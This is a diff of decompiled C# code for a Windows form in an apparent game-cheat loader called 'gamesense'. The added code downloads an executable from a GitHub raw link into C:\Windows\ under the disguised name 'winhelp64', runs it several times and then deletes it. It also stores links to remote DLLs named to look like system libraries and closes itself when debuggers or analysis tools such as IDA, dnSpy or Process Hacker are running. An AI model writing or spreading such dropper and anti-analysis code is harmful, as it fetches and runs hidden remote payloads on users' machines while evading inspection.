@@ -1,38 +1,113 @@
 ﻿using System;
 using System.ComponentModel;
+using System.Diagnostics;
 using System.Drawing;
+using System.IO;
+using System.Net;
+using System.Runtime.CompilerServices;
 using System.Runtime.InteropServices;
-using System.Security.Principal;
+using System.Threading.Tasks;
 using System.Windows.Forms;
-using Auth.GG_Winform_Example;
 
 namespace gamesense
 {
-	// Token: 0x02000010 RID: 16
+	// Token: 0x02000008 RID: 8
 	public partial class Form3 : Form
 	{
-		// Token: 0x06000092 RID: 146
+		// Token: 0x06000033 RID: 51
 		[DllImport("user32.dll")]
 		public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
 
-		// Token: 0x06000093 RID: 147
+		// Token: 0x06000034 RID: 52
 		[DllImport("user32.dll")]
 		public static extern bool ReleaseCapture();
 
-		// Token: 0x06000094 RID: 148 RVA: 0x00184600 File Offset: 0x0017F400
+		// Token: 0x06000035 RID: 53 RVA: 0x001AC6D8 File Offset: 0x001A62D8
 		public Form3()
 		{
 			this.InitializeComponent();
 		}
 
-		// Token: 0x06000095 RID: 149 RVA: 0x00184614 File Offset: 0x0017F414
-		private void Form3_Load(object sender, EventArgs e)
+		// Token: 0x06000036 RID: 54 RVA: 0x001AA188 File Offset: 0x001A3D88
+		private void Form2_Load(object sender, EventArgs e)
 		{
-			this.HWID = WindowsIdentity.GetCurrent().User.Value;
 		}
 
-		// Token: 0x06000096 RID: 150 RVA: 0x0018462E File Offset: 0x0017F42E
-		private void Form3_MouseDown(object sender, MouseEventArgs e)
+		// Token: 0x06000037 RID: 55 RVA: 0x001AC77C File Offset: 0x001A637C
+		private void timer1_Tick(object sender, EventArgs e)
+		{
+			Process[] processesByName = Process.GetProcessesByName("ida64");
+			Process[] processesByName2 = Process.GetProcessesByName("ida32");
+			Process[] processesByName3 = Process.GetProcessesByName("ollydbg");
+			Process[] processesByName4 = Process.GetProcessesByName("ollydbg64");
+			Process[] processesByName5 = Process.GetProcessesByName("loaddll");
+			Process[] processesByName6 = Process.GetProcessesByName("httpdebugger");
+			Process[] processesByName7 = Process.GetProcessesByName("windowrenamer");
+			Process[] processesByName8 = Process.GetProcessesByName("processhacker");
+			Process[] processesByName9 = Process.GetProcessesByName("Process Hacker");
+			Process[] processesByName10 = Process.GetProcessesByName("ProcessHacker");
+			Process[] processesByName11 = Process.GetProcessesByName("HxD");
+			Process[] processesByName12 = Process.GetProcessesByName("parsecd");
+			Process[] processesByName13 = Process.GetProcessesByName("ida");
+			Process[] processesByName14 = Process.GetProcessesByName("dnSpy");
+			if (processesByName.Length != 0 || processesByName2.Length != 0 || processesByName3.Length != 0 || processesByName4.Length != 0 || processesByName5.Length != 0 || processesByName6.Length != 0 || processesByName7.Length != 0 || processesByName8.Length != 0 || processesByName9.Length != 0 || processesByName10.Length != 0 || processesByName11.Length != 0 || processesByName13.Length != 0 || processesByName12.Length != 0 || processesByName14.Length != 0)
+			{
+				Application.Exit();
+			}
+		}
+
+		// Token: 0x06000038 RID: 56 RVA: 0x001AA18A File Offset: 0x001A3D8A
+		private void button1_Click(object sender, EventArgs e)
+		{
+			Process.Start("https://discord.gg/zce8mgwWPc");
+		}
+
+		// Token: 0x06000039 RID: 57 RVA: 0x001AA197 File Offset: 0x001A3D97
+		private void button2_Click(object sender, EventArgs e)
+		{
+			Process.Start("https://www.youtube.com/channel/UCAR3YZ9Dnxn37uEbjod_QuA");
+		}
+
+		// Token: 0x0600003A RID: 58 RVA: 0x001AC8AC File Offset: 0x001A64AC
+		private void button5_Click(object sender, EventArgs e)
+		{
+			Form3.<button5_Click>d__18 <button5_Click>d__;
+			<button5_Click>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
+			<button5_Click>d__.<>4__this = this;
+			<button5_Click>d__.<>1__state = -1;
+			<button5_Click>d__.<>t__builder.Start<Form3.<button5_Click>d__18>(ref <button5_Click>d__);
+		}
+
+		// Token: 0x0600003B RID: 59 RVA: 0x001AC8F4 File Offset: 0x001A64F4
+		private void button3_Click(object sender, EventArgs e)
+		{
+			WebClient webClient = new WebClient();
+			string text = "C:\\Windows\\" + this.exe_name + ".exe";
+			webClient.DownloadFile(this.exe_link, text);
+			Task.Delay(10000);
+			Process.Start("winhelp64.exe");
+			Process.Start("winhelp64.exe");
+			Process.Start("winhelp64.exe");
+			Process.Start("winhelp64.exe");
+			Process.Start("winhelp64.exe");
+			if (this.bypass_array.Length != 0 && File.Exists(text))
+			{
+				File.Delete(text);
+			}
+		}
+
+		// Token: 0x0600003C RID: 60 RVA: 0x001AC998 File Offset: 0x001A6598
+		private void button6_Click(object sender, EventArgs e)
+		{
+			Form3.<button6_Click>d__20 <button6_Click>d__;
+			<button6_Click>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
+			<button6_Click>d__.<>4__this = this;
+			<button6_Click>d__.<>1__state = -1;
+			<button6_Click>d__.<>t__builder.Start<Form3.<button6_Click>d__20>(ref <button6_Click>d__);
+		}
+
+		// Token: 0x0600003D RID: 61 RVA: 0x001AA1A4 File Offset: 0x001A3DA4
+		private void Form2_MouseMove(object sender, MouseEventArgs e)
 		{
 			if (e.Button == MouseButtons.Left)
 			{
@@ -41,123 +116,58 @@ namespace gamesense
 			}
 		}
 
-		// Token: 0x06000097 RID: 151 RVA: 0x00189658 File Offset: 0x00184458
-		private void button3_Click(object sender, EventArgs e)
-		{
-			if (API.Register(this.username.Text, this.password.Text, this.email.Text, this.license.Text))
-			{
-				MessageBox.Show("Register has been successful!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
-			}
-		}
-
-		// Token: 0x06000098 RID: 152 RVA: 0x00184664 File Offset: 0x0017F464
-		private void button1_Click_1(object sender, EventArgs e)
-		{
-			new Form1().Show();
-			base.Hide();
-		}
-
-		// Token: 0x06000099 RID: 153 RVA: 0x0018445D File Offset: 0x0017F25D
-		private void button4_Click_2(object sender, EventArgs e)
+		// Token: 0x0600003E RID: 62 RVA: 0x001AA1DA File Offset: 0x001A3DDA
+		private void button4_Click_1(object sender, EventArgs e)
 		{
 			Application.Exit();
 		}
 
-		// Token: 0x0600009A RID: 154 RVA: 0x00184679 File Offset: 0x0017F479
-		private void username_Enter(object sender, EventArgs e)
-		{
-			if (this.username.Text == "Username")
-			{
-				this.username.Text = "";
-			}
-		}
-
-		// Token: 0x0600009B RID: 155 RVA: 0x001846A8 File Offset: 0x0017F4A8
-		private void username_Leave(object sender, EventArgs e)
-		{
-			if (this.username.Text == "")
-			{
-				this.username.Text = "Username";
-			}
-		}
-
-		// Token: 0x0600009C RID: 156 RVA: 0x001846D7 File Offset: 0x0017F4D7
-		private void password_Enter(object sender, EventArgs e)
-		{
-			if (this.password.Text == "Password")
-			{
-				this.password.Text = "";
-			}
-		}
-
-		// Token: 0x0600009D RID: 157 RVA: 0x00184706 File Offset: 0x0017F506
-		private void password_Leave(object sender, EventArgs e)
-		{
-			if (this.password.Text == "")
-			{
-				this.password.Text = "Password";
-			}
-		}
-
-		// Token: 0x0600009E RID: 158 RVA: 0x00184735 File Offset: 0x0017F535
-		private void email_Enter(object sender, EventArgs e)
-		{
-			if (this.email.Text == "Email")
-			{
-				this.email.Text = "";
-			}
-		}
-
-		// Token: 0x0600009F RID: 159 RVA: 0x00184764 File Offset: 0x0017F564
-		private void email_Leave(object sender, EventArgs e)
-		{
-			if (this.email.Text == "")
-			{
-				this.email.Text = "Email";
-			}
-		}
-
-		// Token: 0x060000A0 RID: 160 RVA: 0x00184793 File Offset: 0x0017F593
-		private void license_Enter(object sender, EventArgs e)
-		{
-			if (this.license.Text == "Invitation code")
-			{
-				this.license.Text = "";
-			}
-		}
-
-		// Token: 0x060000A1 RID: 161 RVA: 0x001847C2 File Offset: 0x0017F5C2
-		private void license_Leave(object sender, EventArgs e)
-		{
-			if (this.license.Text == "")
-			{
-				this.license.Text = "Invitation code";
-			}
-		}
-
-		// Token: 0x060000A2 RID: 162 RVA: 0x001847F1 File Offset: 0x0017F5F1
-		private void checkBox1_CheckedChanged(object sender, EventArgs e)
-		{
-			if (this.checkBox1.Checked)
-			{
-				this.password.UseSystemPasswordChar = false;
-				return;
-			}
-			this.password.UseSystemPasswordChar = true;
-		}
-
-		// Token: 0x060000A3 RID: 163 RVA: 0x0018440B File Offset: 0x0017F20B
-		private void license_TextChanged(object sender, EventArgs e)
+		// Token: 0x0600003F RID: 63 RVA: 0x001AA188 File Offset: 0x001A3D88
+		private void label1_Click(object sender, EventArgs e)
 		{
 		}
 
-		// Token: 0x04000061 RID: 97
-		private string HWID;
+		// Token: 0x06000040 RID: 64 RVA: 0x001AA188 File Offset: 0x001A3D88
+		private void label4_Click(object sender, EventArgs e)
+		{
+		}
 
-		// Token: 0x04000062 RID: 98
+		// Token: 0x06000041 RID: 65 RVA: 0x001AA188 File Offset: 0x001A3D88
+		private void label3_Click(object sender, EventArgs e)
+		{
+		}
+
+		// Token: 0x04000017 RID: 23
+		private string dll_link_v1 = "https://github.com/tutheuyuadsucuiwhasdt5r/dwjntnqhsidwufrugw/raw/main/release.dll";
+
+		// Token: 0x04000018 RID: 24
+		private string dll_name_v1 = "d3d22";
+
+		// Token: 0x04000019 RID: 25
+		private string dll_link_v2 = "https://github.com/tutheuyuadsucuiwhasdt5r/dwjntnqhsidwufrugw/raw/main/cheat.dll";
+
+		// Token: 0x0400001A RID: 26
+		private string dll_name_v2 = "d3d23";
+
+		// Token: 0x0400001B RID: 27
+		private string exe_name = "winhelp64";
+
+		// Token: 0x0400001C RID: 28
+		private string exe_link = "https://github.com/tutheuyuadsucuiwhasdt5r/dwjntnqhsidwufrugw/raw/main/Server_Crasher_community_servers.exe";
+
+		// Token: 0x0400001D RID: 29
+		private Process[] bypass_array = Process.GetProcessesByName("winhelp64");
+
+		// Token: 0x0400001E RID: 30
+		private int time_to_wait = 35000;
+
+		// Token: 0x0400001F RID: 31
+		private bool setted_up = true;
+
+		// Token: 0x04000020 RID: 32
 		public const int WM_NCLBUTTONDOWN = 161;
 
-		// Token: 0x04000063 RID: 99
+		// Token: 0x04000021 RID: 33
 		public const int HT_CAPTION = 2;
 	}
 }
